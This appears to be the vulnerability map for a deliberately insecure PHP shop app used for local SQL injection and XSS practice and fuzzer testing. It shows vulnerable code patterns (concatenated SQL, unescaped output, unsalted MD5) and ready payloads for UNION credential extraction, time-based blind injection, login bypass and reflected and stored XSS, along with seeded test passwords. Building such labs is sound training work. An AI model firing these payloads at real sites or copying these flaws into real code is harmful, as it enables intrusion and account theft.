# Ryder's Puppy Fort Factory — vulnerability map

This app is **deliberately vulnerable** for local security testing. It is a
target for the blind SQL injection fuzzer in the parent repo and for manual
SQLi/XSS practice. **Do not deploy it on a public or shared network.**

## Scope of "vulnerable" vs "secure"

Here "vulnerable" and "secure" refer specifically to **SQL injection (SQLi)**
and **cross-site scripting (XSS)**, the two classes this lab targets. A page
marked *secure* is free of SQLi and XSS; it is not a claim that it is hardened
against every possible attack.

One weakness is intentional and site-wide, outside that scope: **passwords are
stored as unsalted MD5**. That keeps the classic SQLi login bypass simple. It is
a real cryptographic weakness but is not itself an SQLi or XSS issue, so pages
that only do MD5 storage are still listed as *secure* for SQLi/XSS.

## Site structure

```
index.php          Home / featured products          (secure)
products.php       Product listing + category filter  (secure)
product.php        Product detail (?id=)              VULNERABLE  — SQLi
search.php         Product search (?q=)               VULNERABLE  — SQLi + reflected XSS
register.php       User registration                  (secure)
login.php          User login                         VULNERABLE  — SQLi / auth bypass
logout.php         Ends the session                   (secure)
add_to_cart.php    Add item to cart (POST)            (secure)
cart.php           View / remove cart items           (secure)
checkout.php       Order summary + place order        (secure)
profile.php        View own profile                   VULNERABLE  — stored XSS (bio)
edit_profile.php   Edit own profile                   (secure SQLi; input point for the stored XSS)
contact.php        Contact form                       (secure)
includes/, config/, assets/, sql/   support files
```

## Summary table

| Page | Feature | Parameter(s) | SQLi | XSS | Notes |
| --- | --- | --- | :---: | :---: | --- |
| `index.php` | Home | none | No | No | No user input in the query |
| `products.php` | Listing | `category` (GET) | No | No | Prepared statement + escaped output |
| `product.php` | Product detail | `id` (GET) | **Yes** | No | `id` concatenated raw; verbose errors |
| `search.php` | Search | `q` (GET) | **Yes** | **Yes (reflected)** | `q` in a raw `LIKE` and echoed unescaped |
| `register.php` | Sign up | `username`,`email`,`full_name`,`password` (POST) | No | No | Prepared statements + escaped output |
| `login.php` | Log in | `username`,`password` (POST) | **Yes** | No | `username` concatenated raw; auth bypass |
| `logout.php` | Log out | none | No | No | Session teardown only |
| `add_to_cart.php` | Add to cart | `product_id`,`quantity` (POST) | No | No | Integer casts + prepared upsert |
| `cart.php` | View cart | `remove` (POST) | No | No | Prepared statements scoped to user |
| `checkout.php` | Checkout | `place_order` (POST) | No | No | Prepared statements |
| `profile.php` | View profile | none (reads stored `bio`) | No | **Yes (stored)** | `bio` rendered unescaped |
| `edit_profile.php` | Edit profile | `full_name`,`email`,`address`,`bio` (POST) | No | No* | Prepared update; *stores raw `bio` (stored-XSS source) |
| `contact.php` | Contact | `name`,`message` (POST) | No | No | Input reflected through `htmlspecialchars` |

## Vulnerable pages in detail

### 1. `product.php` — SQL injection (`id`)

The query is built by string concatenation:

```php
$id = $_GET['id'] ?? '1';
$sql = "SELECT id, name, description, price, category, stock FROM products WHERE id = $id";
```

Example payloads:

- Boolean: `product.php?id=1 OR 1=1`
- UNION extraction: `product.php?id=0 UNION SELECT username,password,email,1,2,3 FROM users`
- Time-based blind: `product.php?id=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))x)`

This is the primary target for the time-based fuzzer:

```bash
python ../blind_sqli_fuzzer.py --url http://localhost/puppy-fort-factory/product.php --param id --authorized
```

`mysqli_query` runs a single statement, so stacked-query payloads (`; WAITFOR ...`)
do not apply here; SLEEP-, boolean-, and UNION-based injection do.

### 2. `search.php` — SQL injection + reflected XSS (`q`)

```php
$sql = "SELECT ... WHERE name LIKE '%$q%' OR description LIKE '%$q%'";   // SQLi
... value="<?= $q ?>" ...                                                // reflected XSS
<strong><?= $q ?></strong>                                               // reflected XSS
```

- SQLi: `search.php?q=x%' UNION SELECT username,password,email,1 FROM users -- -`
- SQLi (time): `search.php?q=x%' AND (SELECT 1 FROM (SELECT(SLEEP(5)))y) -- -`
- Reflected XSS (body): `search.php?q=<script>alert(document.cookie)</script>`
- Reflected XSS (attribute break-out): `search.php?q="><script>alert(1)</script>`

### 3. `login.php` — SQL injection / authentication bypass (`username`)

```php
$sql = "SELECT id, username FROM users
        WHERE username = '$username' AND password = '" . md5($password) . "'";
```

The password is MD5-hashed in the query, so inject through the **username** field:

- Bypass (any password): username = `admin' -- -`
- Bypass: username = `' OR '1'='1' -- -`
- Time-based: username = `admin' AND (SELECT 1 FROM (SELECT(SLEEP(5)))x)-- -`

### 4. `profile.php` — stored XSS (`bio`)

`profile.php` renders the stored `bio` without escaping. The value is entered on
`edit_profile.php` (which itself uses a prepared statement, so it is not SQLi).

Steps:
1. Log in, open `edit_profile.php`.
2. Set the bio to `<img src=x onerror=alert('stored-xss')>` and save.
3. Load `profile.php` — the payload runs. It also runs for anyone who views that
   stored profile.

## Secure pages (expected true negatives)

`index.php`, `products.php`, `register.php`, `add_to_cart.php`, `cart.php`,
`checkout.php`, `edit_profile.php`, and `contact.php` use prepared statements
and/or integer casts for all database access and escape all output with the
`e()` helper. Point your scanner at these to confirm it does not raise false
positives.

## Test accounts

| Username | Password | Role |
| --- | --- | --- |
| `admin` | `admin123` | seeded admin-ish user |
| `alice` | `password1` | regular user |
| `bob` | `letmein` | regular user |

New accounts can also be created through `register.php`.
